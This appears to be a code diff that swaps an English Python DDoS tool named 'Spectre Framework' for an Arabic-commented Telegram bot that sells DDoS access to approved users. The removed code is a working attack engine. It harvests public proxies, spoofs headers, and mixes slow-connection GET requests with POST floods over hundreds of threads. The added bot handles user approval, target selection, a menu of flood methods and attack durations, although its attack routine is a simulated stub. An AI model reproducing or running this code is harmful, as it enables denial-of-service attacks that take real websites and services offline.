@@ -1,322 +1,457 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-"""
-[ S P E C T R E   F R A M E W O R K ]
-Advanced Multi-Vector DDoS Tool with Real-time Dashboard
-Author: Blackhatsense
-Description: A powerful, stealthy, and evasive connection and application layer
-             exhaustion tool. It combines slow attacks with POST floods and
-             advanced spoofing techniques.
-"""
-
-import os
-import sys
-import time
+import logging
+import asyncio
 import random
-import threading
-import argparse
-import curses
-from urllib.parse import urlparse
-import socket
+import string
+import time
+from datetime import datetime
+import aiohttp
+import requests
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    BotCommand,
+)
+from telegram.ext import (
+    Application,
+    CallbackQueryHandler,
+    CommandHandler,
+    ContextTypes,
+    MessageHandler,
+    filters,
+)
 
-# --- External Libraries ---
-try:
-    import httpx
-    from fake_useragent import UserAgent
-except ImportError:
-    print("[!] Required libraries not found. Install them with:")
-    print("    pip3 install httpx fake-useragent")
-    sys.exit(1)
+# --- الإعدادات الأساسية ---
+TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن البوت بتاعك هنا
+OWNER_ID = 123456789  # ضع يور ID بتاعك هنا عشان تبقى أونر
 
-# --- UI Colors for Dashboard ---
-class Colors:
-    RESET = '\033[0m'
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    MAGENTA = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
+# --- إعدادات الهجوم ---
+ATTACK_METHODS = {
+    "slowloris": {
+        "name": "🐌 Slowloris (Connection Strangler)",
+        "description": "استنزاف الموارد بروابط HTTP بطيئة",
+        "ports": [80, 443],
+    },
+    "http2_rapid": {
+        "name": "⚡ HTTP/2 Rapid Reset",
+        "description": "هجوم HTTP/2 متقدم لتجاوز الحمايات",
+        "ports": [443],
+    },
+    "udp_flood": {
+        "name": "💥 UDP Flood",
+        "description": "فيضان حزم UDP عشوائي",
+        "ports": [53, 80, 443, 8080],
+    },
+    "tcp_ack": {
+        "name": "🔥 TCP ACK Flood",
+        "description": "هجوم TCP ACK لتجاوز الجدران النارية",
+        "ports": [80, 443, 22, 21],
+    },
+}
 
-# --- Configuration & Components ---
+# --- قاعدة بيانات بسيطة (في الذاكرة) ---
+owners = set([OWNER_ID])
+approved_users = set()  # المستخدمين اللي تمت الموافقة عليهم
+pending_users = set()  # المستخدمين اللي مستنيين موافقة
+attack_sessions = {}  # عشان نتابع الهجمات اللي شغالة
 
-class ProxyManager:
-    def __init__(self):
-        self.raw_proxies = []
-        self.validated_proxies = []
-        self.lock = threading.Lock()
+# --- تسجيل الأحداث (Logging) ---
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+)
+logger = logging.getLogger(__name__)
 
-    def fetch(self):
-        proxy_sources = [
-            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
-            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
+
+# --- دوال مساعدة ---
+def is_owner(user_id: int) -> bool:
+    """تتحقق إذا كان المستخدم أونر"""
+    return user_id in owners
+
+
+async def is_valid_target(target: str) -> bool:
+    """تحقق بسيط إذا كان الهدف IP أو رابط صحيح"""
+    if target.replace(".", "").replace(":", "").replace("-", "").replace("/", "").isalnum():
+        return True
+    return False
+
+
+# --- دوال الهجوم (هتكون محاكاة هنا) ---
+async def execute_attack(target: str, port: int, method: str, duration: int, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
+    """
+    هنا هتحط منطق الهجوم الفعلي.
+    ده مجرد مثال، لازم تستخدم مكتبات متخصصة زي socket, aiohttp, asyncio
+    """
+    session_id = random.randint(10000, 99999)
+    logger.info(f"🚀 بدء الهجوم #{session_id} على {target}:{port} باستخدام {method} لمدة {duration} ثانية")
+    
+    # --- هنا بداية منطق الهجوم الفعلي ---
+    # مثال لـ Slowloris
+    if method == "slowloris":
+        # استدعاء دالة Slowloris الفعلية
+        pass
+    elif method == "http2_rapid":
+        # استدعاء دالة HTTP/2 Rapid Reset
+        pass
+    # وهكذا...
+    # --- نهاية منطق الهجوم الفعلي ---
+
+    # محاكاة مرور الوقت
+    for i in range(duration):
+        await asyncio.sleep(1)
+        # ممكن هنا تبعت تحديثات كل 10 ثواني مثلاً
+        if i > 0 and i % 10 == 0:
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"🔄 الهجوم #{session_id} مستمر... ({i}/{duration} ثانية)"
+            )
+
+    logger.info(f"✅ انتهى الهجوم #{session_id}")
+    return session_id
+
+
+# --- معالجات الأوامر والأزرار ---
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """عندما يبدأ المستخدم البوت"""
+    user = update.effective_user
+    user_id = user.id
+    
+    # لو المستخدم أونر
+    if is_owner(user_id):
+        keyboard = [
+            [
+                InlineKeyboardButton("🎯 بدء هجوم جديد", callback_data="new_attack"),
+                InlineKeyboardButton("📊 حالة الهجمات", callback_data="attack_status"),
+            ],
+            [
+                InlineKeyboardButton("👥 طلبات الانضمام", callback_data="pending_requests"),
+                InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="bot_settings"),
+            ],
         ]
-        print(f"{Colors.YELLOW}[*] Fetching proxies...{Colors.RESET}")
-        for source in proxy_sources:
-            try:
-                with httpx.Client(timeout=10) as client:
-                    r = client.get(source)
-                    if r.status_code == 200:
-                        found = [line.strip() for line in r.text.splitlines() if ':' in line]
-                        self.raw_proxies.extend(found)
-            except Exception:
-                pass
-        self.raw_proxies = list(set(self.raw_proxies))
-        print(f"{Colors.GREEN}[+] Total unique raw proxies: {len(self.raw_proxies)}{Colors.RESET}")
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"مرحباً {user.first_name}!\n\n👑 **لوحة تحكم الأونر**",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        return
 
-    def _validate_proxy(self, proxy):
-        try:
-            with httpx.Client(proxies=f"http://{proxy}", timeout=8) as client:
-                r = client.get("http://httpbin.org/ip")
-                if r.status_code == 200:
-                    with self.lock:
-                        self.validated_proxies.append(proxy)
-                    return True
-        except Exception:
-            pass
-        return False
+    # لو المستخدم مواف عليه بالفعل
+    if user_id in approved_users:
+        keyboard = [
+            [
+                InlineKeyboardButton("🚀 بدء هجوم", callback_data="new_attack"),
+                InlineKeyboardButton("📊 حالة الهجمات", callback_data="attack_status"),
+            ],
+            [InlineKeyboardButton("ℹ️ معلومات", callback_data="info")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"مرحباً بك {user.first_name}!\n\nاختر من الأزرار:",
+            reply_markup=reply_markup
+        )
+        return
 
-    def validate(self, threads=50):
-        if not self.raw_proxies:
-            self.fetch()
-        print(f"{Colors.YELLOW}[*] Validating {len(self.raw_proxies)} proxies with {threads} threads...{Colors.RESET}")
-        self.validated_proxies = []
-        threads_list = []
-        for proxy in self.raw_proxies:
-            t = threading.Thread(target=self._validate_proxy, args=(proxy,))
-            t.daemon = True
-            t.start()
-            threads_list.append(t)
-            if len(threads_list) >= threads:
-                for t_thread in threads_list:
-                    t_thread.join()
-                threads_list = []
+    # لو مستخدم جديد أو مستني موافقة
+    if user_id not in pending_users:
+        pending_users.add(user_id)
         
-        for t_thread in threads_list:
-            t_thread.join()
+        # إرسال إشعار للأونر
+        if owners:
+            owner_id = next(iter(owners))
+            approval_keyboard = [
+                [
+                    InlineKeyboardButton("✅ موافق", callback_data=f"approve_{user_id}"),
+                    InlineKeyboardButton("❌ ارفض", callback_data=f"reject_{user_id}"),
+                ]
+            ]
+            reply_markup = InlineKeyboardMarkup(approval_keyboard)
+            
+            await context.bot.send_message(
+                chat_id=owner_id,
+                text=(
+                    f"🔔 **طلب انضمام جديد**\n\n"
+                    f"👤 الاسم: {user.first_name}\n"
+                    f"🆔 اليوزر ID: `{user_id}`\n"
+                    f"👀 يوزرنيم: @{user.username if user.username else 'N/A'}\n\n"
+                    "وافق أو ارفض طلب الانضمام:"
+                ),
+                reply_markup=reply_markup,
+                parse_mode="Markdown"
+            )
+    
+    # رسالة للمستخدم إنه مستني الموافقة
+    await update.message.reply_text(
+        "👋 مرحباً!\n\n"
+        "طلب انضمامك تم إرساله للأونر.\n"
+        "يرجى الانتظار حتى تتم مراجعة طلبك.\n\n"
+        "⏳ ستصل إشعار هنا بمجرد اتخاذ القرار."
+    )
 
-        print(f"{Colors.GREEN}[+] Validation complete. {len(self.validated_proxies)} live proxies.{Colors.RESET}")
-        return self.validated_proxies
 
-class HeaderGenerator:
-    def __init__(self):
-        self.ua = UserAgent()
-        self.referers = [
-            "https://www.google.com/search?q=",
-            "https://www.facebook.com/",
-            "https://www.twitter.com/",
-            "https://www.reddit.com/",
+async def approval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج موافقة أو رفض طلب الانضمام"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    
+    # تأكد إن اللي ضغط على الزر أونر
+    if not is_owner(user_id):
+        await query.edit_message_text("❌ ليس لديك صلاحية للقيام بذلك!")
+        return
+    
+    data = query.data
+    parts = data.split("_")
+    action = parts[0]
+    target_user_id = int(parts[1])
+    
+    try:
+        target_user = await context.bot.get_chat(target_user_id)
+        target_name = target_user.first_name
+    except:
+        target_name = "مستخدم"
+    
+    if action == "approve":
+        approved_users.add(target_user_id)
+        if target_user_id in pending_users:
+            pending_users.remove(target_user_id)
+        
+        await query.edit_message_text(
+            f"✅ **تمت الموافقة** على طلب الانضمام لـ {target_name} (`{target_user_id}`)",
+            parse_mode="Markdown"
+        )
+        
+        await context.bot.send_message(
+            chat_id=target_user_id,
+            text=(
+                "🎉 **تهانينا!\n\n"
+                "تمت الموافقة على طلب انضمامك.\n"
+                "الآن يمكنك استخدام البوت.\n\n"
+                "أرسل /start لبدء استخدام البوت."
+            ),
+            parse_mode="Markdown"
+        )
+        
+    elif action == "reject":
+        if target_user_id in pending_users:
+            pending_users.remove(target_user_id)
+        
+        await query.edit_message_text(
+            f"❌ **تم الرفض** على طلب الانضمام لـ {target_name} (`{target_user_id}`)",
+            parse_mode="Markdown"
+        )
+        
+        await context.bot.send_message(
+            chat_id=target_user_id,
+            text=(
+                "😔 **نأسى لذلك!\n\n"
+                "تم رفض طلب انضمامك للبوت.\n"
+                "لديك الحق في التقديم مرة أخرى في وقت لاحق."
+            ),
+            parse_mode="Markdown"
+        )
+
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج ضغطات الأزرار العامة"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    data = query.data
+    
+    if data == "new_attack" and (is_owner(user_id) or user_id in approved_users):
+        await query.edit_message_text(
+            "أرسل الآن الهدف (IP أو رابط):\n\n"
+            "مثال: 192.168.1.1 أو https://example.com"
+        )
+        
+    elif data == "attack_status" and is_owner(user_id):
+        status_text = "📊 **حالة الهجمات الحالية:**\n\n"
+        if not attack_sessions:
+            status_text += "لا توجد هجمات شغالة حالياً."
+        else:
+            for sid, session in attack_sessions.items():
+                elapsed = (datetime.now() - session['start_time']).total_seconds()
+                status_text += (
+                    f"🆔 الهجوم: `{sid}`\n"
+                    f"🎯 الهدف: `{session['target']}`\n"
+                    f"⚡ الطريقة: {ATTACK_METHODS[session['method']]['name']}\n"
+                    f"⏱️ مضى: {int(elapsed)} ثانية\n\n"
+                )
+        await query.edit_message_text(status_text, parse_mode="Markdown")
+        
+    elif data == "pending_requests" and is_owner(user_id):
+        requests_text = "👥 **طلبات الانضمام المنتظرة:**\n\n"
+        if not pending_users:
+            requests_text += "لا توجد طلبات منتظرة."
+        else:
+            for uid in list(pending_users):
+                requests_text += f"🆔 `{uid}`\n"
+        await query.edit_message_text(requests_text, parse_mode="Markdown")
+
+    elif data == "info":
+        info_text = (
+            "🤖 **معلومات البوت**\n\n"
+            "الإصدار: 2.0\n"
+            "المطور: Blackhatsense\n\n"
+            "التقنيات المتاحة:\n"
+        )
+        for method_key, method_info in ATTACK_METHODS.items():
+            info_text += f"- {method_info['name']}\n"
+        
+        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(info_text, reply_markup=reply_markup)
+        
+    elif data == "back_to_main":
+        # نعيد إرسال رسالة /start عشان نرجع للوحة التحكم
+        # لسه بنعمل update.message.reply_text فمش هينفع، محتاجين نعمل context.bot.send_message
+        # لسه بنستخدم update.callback_query.message.chat_id
+        await start(update, context)
+
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج الرسائل النصية"""
+    user_id = update.effective_user.id
+    text = update.message.text
+    
+    # لو الأونر أو المستخدم المواف عليه بعت هدف
+    if is_owner(user_id) or user_id in approved_users:
+        if await is_valid_target(text):
+            # عرض طرق الهجوم المتاحة
+            keyboard = []
+            for method_key, method_info in ATTACK_METHODS.items():
+                keyboard.append([
+                    InlineKeyboardButton(
+                        f"{method_info['name']}",
+                        callback_data=f"attack_{method_key}_{text}"
+                    )
+                ])
+            
+            keyboard.append([InlineKeyboardButton("🔙 إلغاء", callback_data="back_to_main")])
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_text(
+                f"تم تحديد الهدف: `{text}`\n\n"
+                "اختر طريقة الهجوم:",
+                reply_markup=reply_markup,
+                parse_mode="Markdown"
+            )
+        else:
+            await update.message.reply_text("❌ هدف غير صالح. حاول مرة أخرى.")
+
+
+async def attack_method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج اختيار طريقة الهجوم"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    if data.startswith("attack_"):
+        parts = data.split("_", 2)
+        method = parts[1]
+        target = parts[2]
+        
+        keyboard = [
+            [
+                InlineKeyboardButton("60 ثانية", callback_data=f"duration_{target}_{method}_60"),
+                InlineKeyboardButton("120 ثانية", callback_data=f"duration_{target}_{method}_120"),
+                InlineKeyboardButton("300 ثانية", callback_data=f"duration_{target}_{method}_300"),
+            ],
+            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")],
         ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            f"الهدف: `{target}`\n"
+            f"الطريقة: {ATTACK_METHODS[method]['name']}\n\n"
+            "اختر مدة الهجوم:",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
 
-    def get(self, target_host):
-        return {
-            "User-Agent": self.ua.random,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Referer": f"{random.choice(self.referers)}{random.randint(1000, 99999)}",
-            "Cache-Control": "max-age=0",
-            "Host": target_host,
+
+async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج اختيار مدة الهجوم وبدء الهجوم الفعلي"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    if data.startswith("duration_"):
+        parts = data.split("_", 3)
+        target = parts[1]
+        method = parts[2]
+        duration = int(parts[3])
+        
+        session_id = random.randint(10000, 99999)
+        
+        # حفظ الهجوم في القاعدة
+        attack_sessions[session_id] = {
+            "target": target,
+            "method": method,
+            "duration": duration,
+            "start_time": datetime.now(),
         }
-
-# --- The Core Attack Engine ---
-class SpectreEngine:
-    def __init__(self, target_url, proxies, threads):
-        self.target_url = target_url
-        self.parsed_url = urlparse(target_url)
-        self.host = self.parsed_url.netloc
-        self.proxies = proxies
-        self.threads = threads
-        self.stop_event = threading.Event()
-        self.lock = threading.Lock()
         
-        # Stats
-        self.req_sent = 0
-        self.req_failed = 0
-        self.active_connections = 0
+        await query.edit_message_text(
+            f"🚀 **بدأ الهجوم بنجاح!**\n\n"
+            f"🎯 الهدف: `{target}`\n"
+            f"⚡ الطريقة: {ATTACK_METHODS[method]['name']}\n"
+            f"⏱️ المدة: {duration} ثانية\n"
+            f"🆔 رقم الهجوم: `{session_id}`\n\n"
+            "سيتم إعلامك عند الانتهاء.",
+            parse_mode="Markdown"
+        )
         
-        self.header_gen = HeaderGenerator()
-
-    def _get_random_proxy(self):
-        if not self.proxies: return None
-        return random.choice(self.proxies)
-
-    def _get_random_path(self):
-        paths = [
-            "/", "/login", "/wp-admin/", "/admin", "/api/v1/users", "/search",
-            "/index.html", "/contact", "/about-us", "/products", "/cart",
-            f"/{random.randint(1, 999999)}.jpg", f"/{random.randint(1, 999999)}.php"
-        ]
-        return random.choice(paths)
-
-    def _attack_worker(self):
-        while not self.stop_event.is_set():
-            proxy = self._get_random_proxy()
-            if not proxy:
-                time.sleep(1)
-                continue
-            
-            headers = self.header_gen.get(self.host)
-            path = self._get_random_path()
-            full_url = self.target_url + path
-            
-            # Randomly choose attack vector
-            if random.random() < 0.7: # 70% Slow GET
-                self._slow_get(full_url, proxy, headers)
-            else: # 30% POST Flood
-                self._post_flood(full_url, proxy, headers)
-            
-            time.sleep(random.uniform(0.5, 2.5))
-
-    def _slow_get(self, url, proxy, headers):
+        # بدء الهجوم في الخلفية
+        attack_task = asyncio.create_task(
+            execute_attack(target, 80, method, duration, context, query.from_user.id)
+        )
+        
+        # انتظر حتى ينتهي الهجوم وبعت إشعار
         try:
-            with self.lock: self.active_connections += 1
-            with httpx.Client(proxies=f"http://{proxy}", timeout=20, http2=True) as client:
-                with client.stream("GET", url, headers=headers) as response:
-                    response.read(1) # Read one byte to establish connection
-                    with self.lock: self.req_sent += 1
-                    time.sleep(random.randint(300, 600)) # Hold connection open
-        except (httpx.RequestError, httpx.TimeoutException):
-            with self.lock: self.req_failed += 1
+            final_session_id = await attack_task
+            await context.bot.send_message(
+                chat_id=query.from_user.id,
+                text=f"✅ **انتهى الهجوم #{final_session_id}** بنجاح."
+            )
+        except Exception as e:
+            await context.bot.send_message(
+                chat_id=query.from_user.id,
+                text=f"❌ **حدث خطأ في الهجوم #{session_id}**: {e}"
+            )
         finally:
-            with self.lock: self.active_connections -= 1
+            if session_id in attack_sessions:
+                del attack_sessions[session_id]
 
-    def _post_flood(self, url, proxy, headers):
-        try:
-            with self.lock: self.active_connections += 1
-            post_data = {
-                "user": f"user_{random.randint(1000, 9999)}",
-                "pass": f"pass_{random.randint(1000, 9999)}",
-                "submit": "login"
-            }
-            headers["Content-Type"] = "application/x-www-form-urlencoded"
-            
-            with httpx.Client(proxies=f"http://{proxy}", timeout=10, http2=True) as client:
-                response = client.post(url, data=post_data, headers=headers)
-                with self.lock: self.req_sent += 1
-        except (httpx.RequestError, httpx.TimeoutException):
-            with self.lock: self.req_failed += 1
-        finally:
-            with self.lock: self.active_connections -= 1
 
-    def start(self):
-        for _ in range(self.threads):
-            t = threading.Thread(target=self._attack_worker)
-            t.daemon = True
-            t.start()
-
-    def stop(self):
-        self.stop_event.set()
-
-# --- The Real-time Dashboard ---
-class SpectreDashboard:
-    def __init__(self, engine):
-        self.engine = engine
-        self.stdscr = None
-
-    def _draw(self):
-        self.stdscr.clear()
-        h, w = self.stdscr.getmaxyx()
-        
-        # Title
-        title = " S P E C T R E   F R A M E W O R K "
-        self.stdscr.addstr(0, (w // 2) - len(title) // 2, title, curses.color_pair(1) | curses.A_BOLD)
-        
-        # Status Box
-        status_text = "RUNNING" if not self.engine.stop_event.is_set() else "STOPPED"
-        status_color = curses.color_pair(2) if not self.engine.stop_event.is_set() else curses.color_pair(3)
-        self.stdscr.addstr(2, 2, "Status:", curses.A_BOLD)
-        self.stdscr.addstr(2, 10, status_text, status_color | curses.A_BOLD)
-        
-        # Stats Box
-        self.stdscr.addstr(4, 2, "--- Statistics ---", curses.A_BOLD)
-        self.stdscr.addstr(5, 2, f"Target URL: {self.engine.target_url}")
-        self.stdscr.addstr(6, 2, f"Threads:    {self.engine.threads}")
-        self.stdscr.addstr(7, 2, f"Proxies:    {len(self.engine.proxies)}")
-        self.stdscr.addstr(8, 2, f"Active Con: {self.engine.active_connections}")
-        self.stdscr.addstr(9, 2, f"Req Sent:   {self.engine.req_sent}")
-        self.stdscr.addstr(10, 2, f"Req Failed: {self.engine.req_failed}")
-        
-        rps = self.engine.req_sent / max(1, time.time() - self.start_time)
-        self.stdscr.addstr(11, 2, f"Req/s:      {rps:.2f}")
-        
-        # Instructions
-        self.stdscr.addstr(h-2, 2, "Press 'q' to stop and exit.", curses.A_DIM)
-        
-        self.stdscr.refresh()
-
-    def _run_loop(self):
-        self.start_time = time.time()
-        while not self.engine.stop_event.is_set():
-            try:
-                self._draw()
-                time.sleep(1)
-            except curses.error:
-                break
-
-    def start(self):
-        self.stdscr = curses.initscr()
-        curses.start_color()
-        curses.use_default_colors()
-        curses.curs_set(0)
-        curses.noecho()
-        self.stdscr.nodelay(1)
-        
-        # Color pairs
-        curses.init_pair(1, curses.CYAN, curses.COLOR_BLACK)
-        curses.init_pair(2, curses.GREEN, curses.COLOR_BLACK)
-        curses.init_pair(3, curses.RED, curses.COLOR_BLACK)
-        
-        try:
-            self._run_loop()
-        finally:
-            curses.endwin()
-
-# --- Main Execution ---
 def main():
-    parser = argparse.ArgumentParser(description="Spectre DDoS Framework")
-    parser.add_argument("url", help="Target URL (e.g., https://example.com)")
-    parser.add_argument("-t", "--threads", type=int, default=300, help="Number of attack threads (default: 300)")
-    parser.add_argument("--no-ui", action="store_true", help="Run without the real-time dashboard")
-    args = parser.parse_args()
-
-    if os.name == 'nt':
-        print(f"{Colors.YELLOW}[-] This script is best run on a Linux VPS for optimal performance.{Colors.RESET}")
-
-    # Initialize components
-    proxy_manager = ProxyManager()
-    valid_proxies = proxy_manager.validate()
+    """دالة تشغيل البوت الرئيسية"""
+    application = Application.builder().token(TOKEN).build()
     
-    if not valid_proxies:
-        print(f"{Colors.RED}[-] No valid proxies found. Cannot start attack.{Colors.RESET}")
-        sys.exit(1)
-
-    engine = SpectreEngine(args.url, valid_proxies, args.threads)
+    # معالجات الأوامر
+    application.add_handler(CommandHandler("start", start))
     
-    print(f"{Colors.GREEN}[+] Engine initialized. Starting attack on {args.url}{Colors.RESET}")
-    engine.start()
+    # معالجات الأزرار (الترتيب مهم!)
+    # 1. معالج الموافقة/الرفض (الأكثر تحديدًا)
+    application.add_handler(CallbackQueryHandler(approval_callback, pattern="^(approve|reject)_"))
+    # 2. معالج اختيار طريقة الهجوم
+    application.add_handler(CallbackQueryHandler(attack_method_callback, pattern="^attack_"))
+    # 3. معالج اختيار مدة الهجوم
+    application.add_handler(CallbackQueryHandler(duration_callback, pattern="^duration_"))
+    # 4. المعالج العام للأزرار
+    application.add_handler(CallbackQueryHandler(button_callback))
+    
+    # معالج الرسائل النصية
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    # تشغيل البوت
+    logger.info("🚀 بدء تشغيل بوت DDOS...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
-    if args.no_ui:
-        print(f"{Colors.YELLOW}[*] Attack running in background. Press Ctrl+C to stop.{Colors.RESET}")
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[*] Stopping attack...{Colors.RESET}")
-            engine.stop()
-    else:
-        dashboard = SpectreDashboard(engine)
-        dashboard.start()
-        engine.stop()
-
-    print(f"{Colors.GREEN}[+] Attack stopped. Final stats:{Colors.RESET}")
-    print(f"    Requests Sent: {engine.req_sent}")
-    print(f"    Requests Failed: {engine.req_failed}")
 
 if __name__ == "__main__":
     main()
